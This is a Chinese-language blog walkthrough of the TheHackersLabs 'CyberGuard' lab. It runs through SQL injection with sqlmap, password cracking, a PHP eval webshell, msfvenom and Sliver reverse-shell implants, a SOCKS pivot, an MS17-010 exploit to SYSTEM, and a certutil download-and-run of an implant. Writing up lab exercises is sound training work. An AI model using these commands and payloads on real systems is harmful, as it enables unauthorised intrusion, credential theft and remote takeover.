{"pageProps":{"postData":{"id":"TheHackersLabsCyberGuard","contentHtml":"<h1>CyberGuard</h1>\n<blockquote>\n<p><a href=\"https://labs.thehackerslabs.com/machine/25\">https://labs.thehackerslabs.com/machine/25</a></p>\n</blockquote>\n<p><img src=\"/post-images/TheHackersLabsCyberGuard/image.png\" alt=\"image.png\"></p>\n<p>一共有四台机子：第一台是做路由器/防火墙。其余三台内网主机。</p>\n<p><img src=\"/post-images/TheHackersLabsCyberGuard/image1.png\" alt=\"image.png\"></p>\n<h2>Recon</h2>\n<h3>PortScan</h3>\n<pre><code class=\"hljs language-bash\">➜  CyberGuard nmap -sn 10.0.2.0/24                   \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 21:11 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.0.2.1\nHost is up (0.00072s latency).\nMAC Address: 0A:00:27:00:00:11 (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.0.2.10\nHost is up (0.00047s latency).\nMAC Address: 08:00:27:B3:85:B4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.0.2.20\nHost is up.\nNmap <span class=\"hljs-keyword\">done</span>: 256 IP addresses (3 hosts up) scanned <span class=\"hljs-keyword\">in</span> 2.21 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  CyberGuard nmap -sT -min-rate 10000 -p- 10.0.2.10\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 21:11 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.0.2.10\nHost is up (0.0013s latency).\nNot shown: 65534 filtered tcp ports (no-response)\nPORT   STATE SERVICE\n80/tcp open  http\nMAC Address: 08:00:27:B3:85:B4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 13.54 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  CyberGuard nmap -sT -A -p 80 10.0.2.10                                                       \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 21:12 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.0.2.10\nHost is up (0.00056s latency).\n\nPORT   STATE SERVICE VERSION\n80/tcp open  http    nginx\n|_http-title: Site doesn<span class=\"hljs-string\">'t have a title (application/octet-stream, text/plain; charset=UTF-8).\nMAC Address: 08:00:27:B3:85:B4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): FreeBSD 11.X (92%)\nOS CPE: cpe:/o:freebsd:freebsd:11.2\nAggressive OS guesses: FreeBSD 11.2-RELEASE (92%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 1 hop\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.56 ms 10.0.2.10\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 16.56 seconds\n</span></code></pre>\n<h3>枚举</h3>\n<p><code>HTTP</code> 服务</p>\n<p><img src=\"/post-images/TheHackersLabsCyberGuard/image2.png\" alt=\"image.png\"></p>\n<p>目录爆破，这里扫描久了会被 ban 掉</p>\n<pre><code class=\"hljs language-bash\">➜  CyberGuard gobuster <span class=\"hljs-built_in\">dir</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip -u http://10.0.2.10\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.0.2.10\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,zip\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster <span class=\"hljs-keyword\">in</span> directory enumeration mode\n===============================================================\n/.php                 (Status: 403) [Size: 274]\n/index.php            (Status: 200) [Size: 1048]\n/search               (Status: 200) [Size: 2046]\n/admin                (Status: 302) [Size: 378] [--> http://10.0.2.10/admin/auth/login]\n/up                   (Status: 200) [Size: 2130]\n</code></pre>\n<p>这个 <code>query</code> 和输出结果感觉有股熟悉的味</p>\n<p><img src=\"/post-images/TheHackersLabsCyberGuard/image3.png\" alt=\"image.png\"></p>\n<p><code>sqlmap</code> 跑一波</p>\n<pre><code class=\"hljs language-bash\">sqlmap -r packet -batch --level 3 --risk 3\n</code></pre>\n<p>真跑出来了，在 <code>UA</code> 中存在注入点</p>\n<p><img src=\"/post-images/TheHackersLabsCyberGuard/image4.png\" alt=\"image.png\"></p>\n<h2>SQL Injection</h2>\n<p>使用 <code>sqlmap</code> 直接全给爆出来</p>\n<pre><code class=\"hljs language-bash\">current database: <span class=\"hljs-string\">'cyberguard\ncurrent user: '</span>ian@localhost<span class=\"hljs-string\">'\n\n+------------------------+\n| cache                  |\n| admin_menu             |\n| admin_operation_log    |\n| admin_permissions      |\n| admin_role_menu        |\n| admin_role_permissions |\n| admin_role_users       |\n| admin_roles            |\n| admin_user_permissions |\n| admin_users            |\n| blacklist_user_agents  |\n| cache_locks            |\n| failed_jobs            |\n| job_batches            |\n| jobs                   |\n| migrations             |\n| password_reset_tokens  |\n| sessions               |\n| users                  |\n+------------------------+\n\n# admin_user\n+----+---------------+--------+--------------------------------------------------------------+----------+---------------------+---------------------+----------------+\n| id | name          | avatar | password                                                     | username | created_at          | updated_at          | remember_token |\n+----+---------------+--------+--------------------------------------------------------------+----------+---------------------+---------------------+----------------+\n| 1  | Administrator | NULL   | $2y$12$fN2GC9IgrwHneBpWIY8WwevYshq/qkEhoE6XhU7ClZInAhbW2YltK | admin    | 2024-10-01 17:41:30 | 2024-10-09 02:31:19 | NULL           |\n+----+---------------+--------+--------------------------------------------------------------+----------+---------------------+---------------------+----------------+\n\n</span></code></pre>\n<p>爆破一下密码</p>\n<pre><code class=\"hljs language-bash\">➜  CyberGuard john --wordlist=/usr/share/wordlists/rockyou.txt <span class=\"hljs-built_in\">hash</span>       \nUsing default input encoding: UTF-8\nLoaded 1 password <span class=\"hljs-built_in\">hash</span> (bcrypt [Blowfish 32/64 X3])\nCost 1 (iteration count) is 4096 <span class=\"hljs-keyword\">for</span> all loaded hashes\nWill run 8 OpenMP threads\nPress <span class=\"hljs-string\">'q'</span> or Ctrl-C to abort, almost any other key <span class=\"hljs-keyword\">for</span> status\nkiller           (?)     \n1g 0:00:00:04 DONE (2025-07-27 21:48) 0.2415g/s 34.78p/s 34.78c/s 34.78C/s shadow..sandra\nUse the <span class=\"hljs-string\">\"--show\"</span> option to display all of the cracked passwords reliably\nSession completed. \n</code></pre>\n<p>得到明文密码 <code>killer</code></p>\n<h2>后台利用</h2>\n<p>来到网站后台尝试进行登录</p>\n<p>成功进入后台</p>\n<p><img src=\"/post-images/TheHackersLabsCyberGuard/image5.png\" alt=\"image.png\"></p>\n<p>后台里面有个命令执行的功能（图中的 <code>shell</code>）</p>\n<p>成功执行命令</p>\n<p><img src=\"/post-images/TheHackersLabsCyberGuard/image6.png\" alt=\"image.png\"></p>\n<p>再拿 <code>/etc/passwd</code> 的信息，能知道 <code>ian</code> 用户是存在的</p>\n<pre><code class=\"hljs language-bash\">ian:x:1000:1000:ian,,,:/home/ian:/bin/bash\n</code></pre>\n<h3>尝试 1 ❌</h3>\n<p>尝试反弹 <code>shell</code> ，这里使用 <code>nc</code> 和 <code>/bin/bash</code> 都无法弹出来，一直在加载</p>\n<p>后台还有一个上传功能点，但是没找到上传的文件夹在哪</p>\n<p><img src=\"/post-images/TheHackersLabsCyberGuard/image7.png\" alt=\"image.png\"></p>\n<p>尝试使用命令行来找到上传的文件夹在哪</p>\n<pre><code class=\"hljs language-bash\">find / -name <span class=\"hljs-string\">'result.php'</span> 2>/dev/null\n</code></pre>\n<p>通过 find 命令能找到存放在 <code>/var/www/cyberguard/storage/app/private/result.php</code></p>\n<p><img src=\"/post-images/TheHackersLabsCyberGuard/image8.png\" alt=\"image.png\"></p>\n<p>再看一下当前目录在哪，在 <code>/var/www/cyberguard/public</code></p>\n<p><img src=\"/post-images/TheHackersLabsCyberGuard/image9.png\" alt=\"image.png\"></p>\n<p>我们应该是没有办法切换过去</p>\n<p>所以这里尝试直接写入<code>webshell</code></p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">'&#x3C;?php eval($_POST[\"x\"]);phpinfo();?>'</span> > test.php\n</code></pre>\n<p>可以执行命令</p>\n<p><img src=\"/post-images/TheHackersLabsCyberGuard/image10.png\" alt=\"image.png\"></p>\n<p>但结果还是无法进行反弹 <code>shell</code> ，被阻止</p>\n<h3>尝试 2 ❌</h3>\n<p>尝试使用 <code>MSF</code> 来拿到 <code>shell</code></p>\n<pre><code class=\"hljs language-bash\">➜  CyberGuard msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.2.20 LPORT=4444 -f elf -o sunset\n[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload\n[-] No <span class=\"hljs-built_in\">arch</span> selected, selecting <span class=\"hljs-built_in\">arch</span>: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 130 bytes\nFinal size of elf file: 250 bytes\nSaved as: sunset\n</code></pre>\n<p>上传后在命令执行窗口执行如下命令</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">chmod</span> +x /var/www/cyberguard/storage/app/private/sunset\n/var/www/cyberguard/storage/app/private/sunset\n</code></pre>\n<p>这里还尝试很多种<code>payload</code> ，例如<code>cmd/linux/http/x64/meterpreter_reverse_http</code>  等</p>\n<p>但是结果和在 <code>WebShell</code> 反弹一样，被阻止了</p>\n<h3>尝试 3 ✅</h3>\n<p>这里尝试使用 <code>sliver</code></p>\n<blockquote>\n<p><a href=\"https://github.com/BishopFox/sliver\">https://github.com/BishopFox/sliver</a></p>\n</blockquote>\n<p><code>sliver</code> 有很高的隐蔽性和免杀性能，并且也支持其他的协议</p>\n<pre><code class=\"hljs language-bash\">➜  CyberGuard sliver\nConnecting to localhost:31337 ...\n\n    ███████╗██╗     ██╗██╗   ██╗███████╗██████╗\n    ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗\n    ███████╗██║     ██║██║   ██║█████╗  ██████╔╝\n    ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗\n    ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║\n    ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝\n\nAll hackers gain persist\n[*] Server v1.5.43 - e116a5ec3d26e8582348a29cfd251f915ce4a405\n[*] Welcome to the sliver shell, please <span class=\"hljs-built_in\">type</span> <span class=\"hljs-string\">'help'</span> <span class=\"hljs-keyword\">for</span> options\n\n[*] Check <span class=\"hljs-keyword\">for</span> updates with the <span class=\"hljs-string\">'update'</span> <span class=\"hljs-built_in\">command</span>\n\nsliver >  \n</code></pre>\n<p>使用 <code>WireGuard</code> 协议生成植入物并监听</p>\n<pre><code class=\"hljs language-bash\">sliver > generate --wg 10.0.2.20 -o linux -a amd64 -f binary\n\n[*] Generated unique ip <span class=\"hljs-keyword\">for</span> wg peer tun interface: 100.64.0.2\n[*] Generating new linux/amd64 implant binary\n[*] Symbol obfuscation is enabled\n[*] Build completed <span class=\"hljs-keyword\">in</span> 1m12s\n[*] Implant saved to /root/Desktop/TheHackersLabs/CyberGuard/FORMIDABLE_FLOOR\n\nsliver > wg\n\n[*] Starting Wireguard listener ...\n[*] Successfully started job <span class=\"hljs-comment\">#1</span>\n</code></pre>\n<p>上传到靶机并运行</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">chmod</span> +x /var/www/cyberguard/storage/app/private/FORMIDABLE_FLOOR\n/var/www/cyberguard/storage/app/private/FORMIDABLE_FLOOR\n</code></pre>\n<p>然后可以在 <code>sliver</code> 服务端中看到连接上去了</p>\n<p><img src=\"/post-images/TheHackersLabsCyberGuard/image11.png\" alt=\"image.png\"></p>\n<p>和 <code>MSF</code> 差不多的操作</p>\n<p><img src=\"/post-images/TheHackersLabsCyberGuard/image12.png\" alt=\"image.png\"></p>\n<h2>内网渗透</h2>\n<h3>信息收集</h3>\n<p>我们查看 <code>databases.php</code></p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-string\">'default'</span> => [\n            <span class=\"hljs-string\">'url'</span> => <span class=\"hljs-built_in\">env</span>(<span class=\"hljs-string\">'REDIS_URL'</span>),\n            <span class=\"hljs-string\">'host'</span> => <span class=\"hljs-built_in\">env</span>(<span class=\"hljs-string\">'REDIS_HOST'</span>, <span class=\"hljs-string\">'127.0.0.1'</span>),\n            <span class=\"hljs-string\">'username'</span> => <span class=\"hljs-built_in\">env</span>(<span class=\"hljs-string\">'REDIS_USERNAME'</span>),\n            <span class=\"hljs-string\">'password'</span> => <span class=\"hljs-built_in\">env</span>(<span class=\"hljs-string\">'REDIS_PASSWORD'</span>),\n            <span class=\"hljs-string\">'port'</span> => <span class=\"hljs-built_in\">env</span>(<span class=\"hljs-string\">'REDIS_PORT'</span>, <span class=\"hljs-string\">'6379'</span>),\n            <span class=\"hljs-string\">'database'</span> => <span class=\"hljs-built_in\">env</span>(<span class=\"hljs-string\">'REDIS_DB'</span>, <span class=\"hljs-string\">'0'</span>),\n        ],\n</code></pre>\n<p>发现数据库凭据存放在环境变量中</p>\n<pre><code class=\"hljs language-bash\">DB_PASSWORD=ZqBHR4MZ&#x3C;f*+bv(J\nREDIS_HOST=127.0.0.1\nDB_HOST=127.0.0.1\nQUEUE_CONNECTION=database\n</code></pre>\n<p>得到一串密码 <code>ZqBHR4MZ&#x3C;f*+bv(J</code></p>\n<p>经过测试我们知道密码是 <code>ian</code> 账户的</p>\n<pre><code class=\"hljs language-bash\">[*] Started remote shell with pid 1069\n\nwww-data@TheHackersLabs-2-Cyberguard:/var/www/cyberguard/config$ su ian\nPassword: \nian@TheHackersLabs-2-Cyberguard:/var/www/cyberguard/config$ \n</code></pre>\n<p>查看正在监听的端口</p>\n<pre><code class=\"hljs language-bash\">ian@TheHackersLabs-2-Cyberguard:~$ ss -tulpn\nNetid State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess                                             \nudp   UNCONN 0      0            0.0.0.0:59645      0.0.0.0:*                                                       \nudp   UNCONN 0      0            0.0.0.0:51236      0.0.0.0:*    <span class=\"hljs-built_in\">users</span>:((\"ss\",pid=<span class=\"hljs-number\">1098</span>,fd=<span class=\"hljs-number\">7</span>),(\"bash\",pid=<span class=\"hljs-number\">1082</span>,fd=<span class=\"hljs-number\">7</span>))\nudp   UNCONN 0      0               [::]:51236         [::]:*    <span class=\"hljs-built_in\">users</span>:((\"ss\",pid=<span class=\"hljs-number\">1098</span>,fd=<span class=\"hljs-number\">3</span>),(\"bash\",pid=<span class=\"hljs-number\">1082</span>,fd=<span class=\"hljs-number\">3</span>))\ntcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*                                                       \ntcp   LISTEN 0      80         127.0.0.1:3306       0.0.0.0:*                                                       \ntcp   LISTEN 0      128             [::]:22            [::]:*                                                       \ntcp   LISTEN 0      511                *:8080             *:*  \n</code></pre>\n<p>查看 <code>ip</code> ，得到内网网段 <code>10.20.30.0/24</code></p>\n<pre><code class=\"hljs language-bash\">www-data@TheHackersLabs-2-Cyberguard:/var/www/cyberguard/config$ ip add\n1: lo: &#x3C;LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    <span class=\"hljs-built_in\">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host noprefixroute \n       valid_lft forever preferred_lft forever\n2: enp0s3: &#x3C;BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000\n    <span class=\"hljs-built_in\">link</span>/ether 08:00:27:f1:07:77 brd ff:ff:ff:ff:ff:ff\n    inet 10.20.30.11/24 brd 10.20.30.255 scope global enp0s3\n       valid_lft forever preferred_lft forever\n    inet6 fe80::a00:27ff:fef1:777/64 scope <span class=\"hljs-built_in\">link</span> \n       valid_lft forever preferred_lft forever\n</code></pre>\n<h3>搭建代理</h3>\n<p>方便渗透内网主机，这里使用 <code>sliver</code>  搭建代理</p>\n<p>文档链接：<a href=\"https://sliver.sh/docs?name=Reverse+SOCKS\">https://sliver.sh/docs?name=Reverse+SOCKS</a></p>\n<p>这里使用 <code>WireGuard SOCKS5</code></p>\n<pre><code class=\"hljs language-bash\">sliver (FORMIDABLE_FLOOR) > info \n\n        Session ID: 160113c3-b76b-4b38-a5eb-a03335a7dbb8\n              Name: FORMIDABLE_FLOOR\n          Hostname: TheHackersLabs-2-Cyberguard\n              UUID: ed3dcaa8-d130-48be-8973-73101c3c3c31\n          Username: www-data\n               UID: 33\n               GID: 33\n               PID: 1053\n                OS: linux\n           Version: Linux TheHackersLabs-2-Cyberguard 6.1.0-25-amd64\n            Locale: C\n              Arch: amd64\n         Active C2: wg://10.0.2.20:53\n    Remote Address: 100.64.0.3:65311\n         Proxy URL: \nReconnect Interval: 1m0s\n     First Contact: Mon Jul 28 12:49:33 CST 2025 (40m46s ago)\n      Last Checkin: Mon Jul 28 13:28:31 CST 2025 (1m48s ago)\n</code></pre>\n<p>创建 <code>WireGuard</code> 客户端配置</p>\n<pre><code class=\"hljs language-bash\">sliver (FORMIDABLE_FLOOR) > wg-config\n\n[*] New client config:[Interface]\nAddress = 100.64.0.6/16\nListenPort = 51902\nPrivateKey = MLVcslgYICxAUJMnhPF/h6LAiqOfjh1vF38pZdOt20w=\nMTU = 1420\n\n[Peer]\nPublicKey = q36gtpUVlt9b9vCe4ZuM8+tU7zrDmN9SCAuSQ2jTYgQ=\nAllowedIPs = 100.64.0.0/16\nEndpoint = 10.0.2.20:53\n</code></pre>\n<p>使用 <code>wg-quick</code> 进行连接</p>\n<pre><code class=\"hljs language-bash\">➜  CyberGuard vim wgsocks.conf\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  CyberGuard wg-quick up wgsocks            \n[#] ip <span class=\"hljs-built_in\">link</span> add wgsocks <span class=\"hljs-built_in\">type</span> wireguard\n[#] wg setconf wgsocks /dev/fd/63\n[#] ip -4 address add 100.64.0.6/16 dev wgsocks\n[#] ip <span class=\"hljs-built_in\">link</span> <span class=\"hljs-built_in\">set</span> mtu 1420 up dev wgsocks\n</code></pre>\n<p>再在 <code>sliver</code> 中运行 <code>wg-socks</code></p>\n<pre><code class=\"hljs language-bash\">sliver (FORMIDABLE_FLOOR) > wg-socks start\n\n[*] Started SOCKS server on 100.64.0.3:3090\n</code></pre>\n<p>编辑 <code>/etc/proxychains4.conf</code> 文件</p>\n<p><img src=\"/post-images/TheHackersLabsCyberGuard/image13.png\" alt=\"image.png\"></p>\n<p>测试连接，使用代理连接 <code>10.20.30.11</code> 的 <code>SSH</code> 服务</p>\n<p><img src=\"/post-images/TheHackersLabsCyberGuard/image14.png\" alt=\"image.png\"></p>\n<p>当前用户可以拿到 <code>user.txt</code></p>\n<pre><code class=\"hljs language-bash\">ian@TheHackersLabs-2-Cyberguard:~$ <span class=\"hljs-built_in\">cat</span> user.txt \n1850axxxxxxxxxxxxxxxxxxxxxxxxx\n</code></pre>\n<h3><strong>10.20.30.11</strong></h3>\n<p>查看 <code>sudo</code> 权限</p>\n<pre><code class=\"hljs language-bash\">ian@TheHackersLabs-2-Cyberguard:~$ <span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> ian on TheHackersLabs-2-Cyberguard:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\n\nUser ian may run the following commands on TheHackersLabs-2-Cyberguard:\n    (ALL) NOPASSWD: /usr/bin/tcpdump, /usr/sbin/arpspoof\n</code></pre>\n<p>我这里打算进行提权，但是<code>tcpdump</code> 并无法进行运行脚本，索性先放掉</p>\n<p>这里上传 <code>fscan</code> 进行内网枚举</p>\n<pre><code class=\"hljs language-bash\">sliver (FORMIDABLE_FLOOR) > upload ../../Tools/fscan/fscan_1.8.4\n\n[*] Wrote file to /var/www/cyberguard/config/fscan_1.8.4\n</code></pre>\n<p>指定 <code>IP</code> 范围 <code>10.20.30.1-255</code></p>\n<pre><code class=\"hljs language-bash\">ian@TheHackersLabs-2-Cyberguard:~$ ./fscan_1.8.4 -h 10.20.30.1-255\n\n   ___                              _    \n  / _ \\     ___  ___ _ __ __ _  ___| | __ \n / /_\\/____/ __|/ __| <span class=\"hljs-string\">'__/ _` |/ __| |/ /\n/ /_\\\\_____\\__ \\ (__| | | (_| | (__|   &#x3C;    \n\\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\   \n                     fscan version: 1.8.4\nstart infoscan\ntrying RunIcmp2\nThe current user permissions unable to send icmp packets\nstart ping\n(icmp) Target 10.20.30.11     is alive\n(icmp) Target 10.20.30.1      is alive\n(icmp) Target 10.20.30.3      is alive\n(icmp) Target 10.20.30.15     is alive\n[*] Icmp alive hosts len is: 4\n10.20.30.3:445 open\n10.20.30.3:139 open\n10.20.30.3:135 open\n10.20.30.1:80 open\n10.20.30.15:22 open\n10.20.30.11:22 open\n10.20.30.11:8080 open\n10.20.30.3:88 open\n10.20.30.1:8090 open\n[*] alive ports len is: 9\nstart vulscan\n[+] MS17-010 10.20.30.3 (Windows Server 2016 Datacenter 14393)\n[*] NetInfo \n[*]10.20.30.3\n   [->]WIN-VRU3GG3DPLJ\n   [->]10.20.30.3\n[*] NetBios 10.20.30.3      [+] DC:WIN-VRU3GG3DPLJ.cyberguard.thl      Windows Server 2016 Datacenter 14393\n[*] WebTitle http://10.20.30.11:8080   code:200 len:1045   title:Join Our Cybersecurity Team\n[*] WebTitle http://10.20.30.1         code:200 len:1039   title:Join Our Cybersecurity Team\n[*] WebTitle http://10.20.30.1:8090    code:200 len:2784   title:Login | OPNsense\n</span></code></pre>\n<h3>MS17-010 ✅</h3>\n<p>竟然枚举出来了 <code>10.20.30.3</code> 存在永恒之蓝（MS17-010），尝试一波</p>\n<pre><code class=\"hljs language-bash\">proxychains4 -q msfconsole\n</code></pre>\n<pre><code class=\"hljs language-bash\">msf6 auxiliary(admin/smb/ms17_010_command) > run\n[*] 10.20.30.3:445        - Target OS: Windows Server 2016 Datacenter 14393\n[*] 10.20.30.3:445        - Built a write-what-where primitive...\n[+] 10.20.30.3:445        - Overwrite complete... SYSTEM session obtained!\n[+] 10.20.30.3:445        - Service start timed out, OK <span class=\"hljs-keyword\">if</span> running a <span class=\"hljs-built_in\">command</span> or non-service executable...\n[*] 10.20.30.3:445        - Getting the <span class=\"hljs-built_in\">command</span> output...\n[*] 10.20.30.3:445        - Executing cleanup...\n[+] 10.20.30.3:445        - Cleanup was successful\n[+] 10.20.30.3:445        - Command completed successfully!\n[*] 10.20.30.3:445        - Output <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">\"whoami\"</span>:\n\nnt authority\\system\n\n[*] 10.20.30.3:445        - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n</code></pre>\n<p>然后可以直接读取 <code>root.txt</code></p>\n<pre><code class=\"hljs language-bash\">msf6 auxiliary(admin/smb/ms17_010_command) > <span class=\"hljs-built_in\">set</span> ComMAND <span class=\"hljs-built_in\">type</span> C:\\\\<span class=\"hljs-built_in\">users</span>\\\\Administrador\\\\Documents\\\\root.txt\nComMAND => <span class=\"hljs-built_in\">type</span> C:\\<span class=\"hljs-built_in\">users</span>\\Administrador\\Documents\\root.txt\nmsf6 auxiliary(admin/smb/ms17_010_command) > run\n[*] 10.20.30.3:445        - Target OS: Windows Server 2016 Datacenter 14393\n[*] 10.20.30.3:445        - Built a write-what-where primitive...\n[+] 10.20.30.3:445        - Overwrite complete... SYSTEM session obtained!\n[+] 10.20.30.3:445        - Service start timed out, OK <span class=\"hljs-keyword\">if</span> running a <span class=\"hljs-built_in\">command</span> or non-service executable...\n[*] 10.20.30.3:445        - Getting the <span class=\"hljs-built_in\">command</span> output...\n[*] 10.20.30.3:445        - Executing cleanup...\n[+] 10.20.30.3:445        - Cleanup was successful\n[+] 10.20.30.3:445        - Command completed successfully!\n[*] 10.20.30.3:445        - Output <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">\"type C:\\users\\Administrador\\Documents\\root.txt\"</span>:\n\n0257xxxxxxxxxxxxxxxxxxxxxxxxx\n\n[*] 10.20.30.3:445        - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n</code></pre>\n<p>拿 <code>shell</code> 的话可以生成 <code>Windows</code> 植入物</p>\n<pre><code class=\"hljs language-bash\">sliver (FORMIDABLE_FLOOR) > generate -o windows --wg 10.0.2.20 -a amd64 -f exe \n\n[*] Generated unique ip <span class=\"hljs-keyword\">for</span> wg peer tun interface: 100.64.0.7\n[*] Generating new windows/amd64 implant binary\n[*] Symbol obfuscation is enabled\n[*] Build completed <span class=\"hljs-keyword\">in</span> 1m1s\n[*] Implant saved to /root/Desktop/TheHackersLabs/CyberGuard/LONG_PRIVATE.exe\n</code></pre>\n<p>上传到 <code>10.20.30.11</code> 并开启 <code>HTTP</code> 服务器</p>\n<pre><code class=\"hljs language-bash\">ian@TheHackersLabs-2-Cyberguard:~$ python3 -m http.server 2131\nServing HTTP on 0.0.0.0 port 2131 (http://0.0.0.0:2131/) ...\n</code></pre>\n<p>然后通过 <code>certutil.exe</code> 下载到 <code>c</code> 盘</p>\n<pre><code class=\"hljs language-bash\">msf6 auxiliary(admin/smb/ms17_010_command) > <span class=\"hljs-built_in\">set</span> <span class=\"hljs-built_in\">command</span> <span class=\"hljs-string\">\"certutil.exe -urlcache -split -f http://10.20.30.11:2131/LONG_PRIVATE.exe C:\\\\LONG_PRIVATE.exe\"</span>\n<span class=\"hljs-string\">\"\nmsf6 auxiliary(admin/smb/ms17_010_command) > run\n[*] 10.20.30.3:445        - Target OS: Windows Server 2016 Datacenter 14393\n[*] 10.20.30.3:445        - Built a write-what-where primitive...\n[+] 10.20.30.3:445        - Overwrite complete... SYSTEM session obtained!\n[+] 10.20.30.3:445        - Service start timed out, OK if running a command or non-service executable...\n[*] 10.20.30.3:445        - Getting the command output...\n[*] 10.20.30.3:445        - Executing cleanup...\n[+] 10.20.30.3:445        - Cleanup was successful\n[+] 10.20.30.3:445        - Command completed successfully!\n[*] 10.20.30.3:445        - Output for \"</span>certutil.exe -urlcache -<span class=\"hljs-built_in\">split</span> -f http://10.20.30.11:2131/LONG_PRIVATE.exe<span class=\"hljs-string\">\":\n\n****  En lnea  ****\n  000000  ...\n  1280000\nCertUtil: -URLCache comando completado correctamente.\n\n[*] 10.20.30.3:445        - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n</span></code></pre>\n<p>之后运行 <code>LONG_PRIVATE.exe</code></p>\n<pre><code class=\"hljs language-bash\">msf6 auxiliary(admin/smb/ms17_010_command) > <span class=\"hljs-built_in\">set</span> <span class=\"hljs-built_in\">command</span> <span class=\"hljs-string\">\"C:\\\\LONG_PRIVATE.exe\"</span>\nmsf6 auxiliary(admin/smb/ms17_010_command) > run\n</code></pre>\n<p><img src=\"/post-images/TheHackersLabsCyberGuard/images15.jpg\" alt=\"image.jpg\"></p>\n<p>然后就拿到 <code>shell</code> 了</p>\n<pre><code class=\"hljs language-bash\">sliver (LONG_PRIVATE) > shell\n\n? This action is bad OPSEC, are you an adult? Yes\n\n[*] Wait approximately 10 seconds after <span class=\"hljs-built_in\">exit</span>, and press &#x3C;enter> to <span class=\"hljs-built_in\">continue</span>\n[*] Opening shell tunnel (EOF to <span class=\"hljs-built_in\">exit</span>) ...\n\n[*] Started remote shell with pid 1292\n\nPS C:\\Windows\\system32> <span class=\"hljs-built_in\">whoami</span>\n<span class=\"hljs-built_in\">whoami</span>\nnt authority\\system\n</code></pre>\n<h2>总结</h2>\n<p>蛮难的，在弹 <code>shell</code>的时候卡了很久（这里看了<code>WP</code>才知道要用<code>sliver</code>弹）</p>\n<p>打完之后发现，预期解并不是使用 <code>MS17-010</code></p>\n<p>而是在另外一台 <code>Linux</code> 主机中监听数据包能得到 <code>Victor</code> 用户的 <code>Net-NTLM-hash</code> ，之后再使用 <code>certipy</code> 进行操作</p>\n<p>预期解WP：<a href=\"https://blog.thehackerslabs.com/resolucion-del-ctf-cyberguard/\">https://blog.thehackerslabs.com/resolucion-del-ctf-cyberguard/</a></p>\n<p>还有学习到了 <code>sliver</code> 这个 <code>C2</code> 框架，感觉还不错，不用自己再端口转发才能上线</p>","title":"TheHackersLabs - CyberGuard","date":"2025-07-28","updated":"2025-07-28","tags":["TheHackersLabs","Windows","Linux","MS17-010","Sliver","Sqlinjection"],"categories":"靶机","comments":true,"description":"CyberGuard\n\n https://labs.thehackerslabs.com/machine/25\n \n\n\n\n一共有四台机子：第一台是做路由器/防火墙。其余三台内网主机。\n\n\n\nRecon\n\nPortScan\n\n\n\n\n\n\n\n枚举\n\n`HTTP` 服务\n\n\n\n目录爆破，这里扫描久了会被 ban 掉\n\n\n\n这个 `query` 和输出结果感觉有股熟悉的味\n\n\n\n`sqlmap` 跑一波\n\n..."},"recentPosts":[{"id":"HackTheBoxSeason9 - Imagery","title":"HackTheBox - Season9 - 